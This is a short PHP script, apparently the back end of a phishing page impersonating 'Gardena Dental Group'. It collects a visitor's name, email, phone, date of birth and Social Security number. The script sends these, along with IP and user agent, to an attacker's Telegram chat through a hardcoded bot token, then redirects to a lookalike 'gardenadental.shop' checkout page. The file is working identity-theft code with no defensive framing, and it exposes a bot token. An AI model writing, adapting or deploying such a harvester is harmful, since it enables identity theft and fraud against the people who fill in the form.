<?php
if (isset($_POST['submit'])) {
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $email = $_POST['email'] ??'';
    $phone = $_POST['phone'] ??'';
    $dob = $_POST['dob'] ??'';
    $ssn = $_POST['ssn'] ??'';
    $ip_address = $_POST['ip_address'] ??'';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $message = "Gardena Dental Group\n\nFirst Name : $firstName\nLast Name : $lastName\nEmail : $email\nPhone : $phone\nDate of Birth : $dob\nSSN : $ssn\n\nIP Address : $ip_address\n$userAgent";
    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
    $chatId = '-4104959417';
    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $chTelegram = curl_init($telegramUrl);
    curl_setopt($chTelegram, CURLOPT_POST, true);
    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $telegramResponse = curl_exec($chTelegram);
    curl_close($chTelegram);
    if ($telegramResponse !== false) {
        header("Location: https://gardenadental.shop:5000/checkout"); 
        exit;
    } else {
        echo "Došlo je do greške prilikom slanja poruke.";
    }
}
?>
